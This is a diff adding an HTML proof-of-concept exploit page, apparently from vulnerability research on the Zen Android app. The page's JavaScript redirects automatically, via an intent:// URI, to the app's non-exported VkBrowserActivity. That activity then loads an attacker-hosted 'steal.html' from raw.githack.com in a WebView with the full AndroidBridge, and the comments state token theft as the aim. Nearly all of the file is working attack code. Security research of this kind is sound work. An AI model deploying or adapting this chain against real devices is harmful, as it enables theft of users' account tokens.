@@ -1,0 +1,61 @@
+<!doctype html>
+<!--
+  Zen intent-redirect PoC — VkBrowserActivity chain (Finding #1 upgraded).
+
+  Loaded inside Zen's in-app browser (no JS bridge here).
+  Redirects via intent:// to non-exported VkBrowserActivity, which loads
+  steal.html in SAK WebView WITH full AndroidBridge (100+ VKWebApp methods).
+
+  Chain: deeplink/PoC → ZenDeeplinkActivity → browser WebView loads this page
+  → intent:// redirect → VkBrowserActivity(directUrl=steal.html, webAppId=7058363)
+  → SAK WebView + AndroidBridge → token theft
+
+  Previous version (FLAG_GRANT_READ, refuted on API 29+) saved as a_fileprovider.html.
+-->
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Zen PoC — VkBrowserActivity chain</title>
+</head>
+<body style="font-family:sans-serif;font-size:15px;padding:20px;line-height:1.6">
+<h2>Finding #1 — VkBrowserActivity + AndroidBridge</h2>
+<pre id="out" style="white-space:pre-wrap;word-break:break-word;background:#f5f5f5;padding:16px;border-radius:8px;font-size:13px">preparing redirect…</pre>
+<p><a id="manual" href="#">[manual trigger]</a></p>
+<script>
+(function() {
+  var out = document.getElementById('out');
+  function log(s) { out.textContent += "\n" + s; }
+  out.textContent = "origin: " + location.origin;
+  log("href:   " + location.href);
+
+  // ---- CONFIG ----
+  // Set your raw.githack.com base URL here.
+  // Format: https://raw.githack.com/{USER}/{REPO}/{BRANCH}/results/pocs/zen_intent_redirect/web/
+  var GITHACK_BASE = 'https://raw.githack.com/user/repo/master/results/pocs/zen_intent_redirect/web/';
+  // ---- END CONFIG ----
+
+  var stealUrl = GITHACK_BASE + 'steal.html';
+  log("steal page: " + stealUrl);
+
+  // intent:// URI: component targets non-exported VkBrowserActivity (same uid = OK).
+  // S.directUrl = attacker page loaded in SAK WebView WITH AndroidBridge.
+  // l.webAppId  = valid mini-app id → full bridge, not stripped-down browser fragment.
+  var intentUri = 'intent://vkbrowser#Intent;'
+    + 'component=ru.zen.android/com.vk.superapp.browser.ui.VkBrowserActivity;'
+    + 'S.directUrl=' + stealUrl + ';'
+    + 'l.webAppId=7058363;'
+    + 'end';
+
+  log("\nintent URI:");
+  log(intentUri);
+
+  document.getElementById('manual').href = intentUri;
+
+  log("\nauto-redirect in 1 s …");
+  setTimeout(function() {
+    log(">>> redirecting now");
+    location.href = intentUri;
+  }, 1000);
+})();
+</script>
+</body>
+</html>
